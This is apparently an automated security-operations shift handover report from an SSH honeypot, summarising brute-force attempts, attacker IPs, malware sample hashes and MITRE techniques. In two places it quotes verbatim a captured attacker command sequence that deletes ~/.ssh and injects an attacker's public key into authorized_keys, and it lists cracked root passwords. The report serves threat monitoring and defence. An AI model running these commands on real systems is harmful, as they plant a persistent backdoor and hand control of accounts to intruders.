# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T07:01:06Z |
| **Shift Time** | 07:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **20** |
| Confirmed Threats | **17** |
| False Positives Filtered | **3** (15.0%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **11** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **18** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **15** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **11** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `blank` | 3 |
| `supervisor` | 2 |
| `root` | 2 |
| `Operator` | 1 |
| `operator` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123123123` | 2 |
| `blank2015` | 1 |
| `blank2020` | 1 |
| `qwerty12` | 1 |
| `supervisor2017` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `blank2015` | 1 |
| `blank` | `blank2020` | 1 |
| `Operator` | `qwerty12` | 1 |
| `operator` | `123123123` | 1 |
| `supervisor` | `supervisor2017` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Passwd@` | `113.193.234.210` | 2026-03-29T06:40:41 |
| `root` | `3245gs5662d34` | `113.193.234.210` | 2026-03-29T06:40:43 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.193.234.210`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **17** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS42682` | JSC ER-Telecom Holding | 1 | HIGH |
| `AS4713` | NTT DOCOMO BUSINESS,Inc. | 1 | HIGH |
| `AS1741` | CSC - Tieteen tietotekniikan keskus Oy | 1 | HIGH |
| `AS38731` | Vietel - CHT Compamy Ltd | 1 | HIGH |
| `AS25159` | PJSC MegaFon | 1 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bc2aba5de2c6

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-03-29 06:40 |
| **Last Seen** | 2026-03-29 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 06:40:41` | `cowrie.session.connect` |
| `2026-03-29 06:40:41` | `cowrie.client.version` |
| `2026-03-29 06:40:41` | `cowrie.client.kex` |
| `2026-03-29 06:40:41` | `cowrie.login.success` |
| `2026-03-29 06:40:41` | `cowrie.session.params` |
| `2026-03-29 06:40:41` | `cowrie.command.input` |
| `2026-03-29 06:40:41` | `cowrie.command.failed` |
| `2026-03-29 06:40:41` | `cowrie.log.closed` |
| `2026-03-29 06:40:41` | `cowrie.session.params` |
| `2026-03-29 06:40:41` | `cowrie.command.input` |
| `2026-03-29 06:40:41` | `cowrie.session.file_download` |
| `2026-03-29 06:40:41` | `cowrie.log.closed` |
| `2026-03-29 06:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47502d6f3c9

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-03-29 06:40 |
| **Last Seen** | 2026-03-29 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 06:40:43` | `cowrie.session.connect` |
| `2026-03-29 06:40:43` | `cowrie.client.version` |
| `2026-03-29 06:40:43` | `cowrie.client.kex` |
| `2026-03-29 06:40:43` | `cowrie.login.success` |
| `2026-03-29 06:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `113.193.234[.]210` | 1 | 2026-03-29 06:40 | 2026-03-29 06:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.7.248[.]50` | 1 | 2026-03-29 06:52 | 2026-03-29 06:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.175.160[.]58` | 1 | 2026-03-29 06:52 | 2026-03-29 06:52 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.160.166[.]237` | 1 | 2026-03-29 06:33 | 2026-03-29 06:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.102.101[.]248` | 1 | 2026-03-29 05:54 | 2026-03-29 05:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `153.195.183[.]165` | 1 | 2026-03-29 06:22 | 2026-03-29 06:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `171.244.61[.]137` | 1 | 2026-03-29 06:33 | 2026-03-29 06:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]50` | 1 | 2026-03-29 06:27 | 2026-03-29 06:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.63.220[.]210` | 1 | 2026-03-29 05:56 | 2026-03-29 05:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.243.68[.]66` | 1 | 2026-03-29 06:12 | 2026-03-29 06:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.53.222[.]191` | 1 | 2026-03-29 06:56 | 2026-03-29 06:56 | 12s | 0 | `T1592` | 🟢 LOW |
| `65.20.205[.]197` | 1 | 2026-03-29 05:48 | 2026-03-29 05:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-03-29 06:13 | 2026-03-29 06:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.50.116[.]224` | 1 | 2026-03-29 06:53 | 2026-03-29 06:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.79.57[.]221` | 1 | 2026-03-29 06:07 | 2026-03-29 06:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.66.44[.]246` | SE | Telia Network Services | **100** ⚠️ | 21 |
| `14.102.101[.]248` | IN | World Phone Internet Services Pvt Ltd | **100** ⚠️ | 41 |
| `65.20.205[.]197` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `86.50.116[.]224` | FI | Student Village Foundation of Turku | **100** ⚠️ | 2 |
| `171.244.61[.]137` | VN | Viettel Group | **100** ⚠️ | 43 |
| `35.243.68[.]66` | JP | Google LLC | **100** ⚠️ | 38 |
| `117.175.160[.]58` | CN | China Mobile Communications Corporation | **100** ⚠️ | 39 |
| `95.79.57[.]221` | RU | JSC ER-Telecom Holding Nizhny Novgorod branch | **100** ⚠️ | 50 |
| `37.53.222[.]191` | UA | JSC Ukrtelecom | **100** ⚠️ | 12 |
| `116.7.248[.]50` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 15 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 20 cases |
| Tool 34  | Credential Extractor        | ✅ 15 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (15.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 15 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T07:01:06Z_
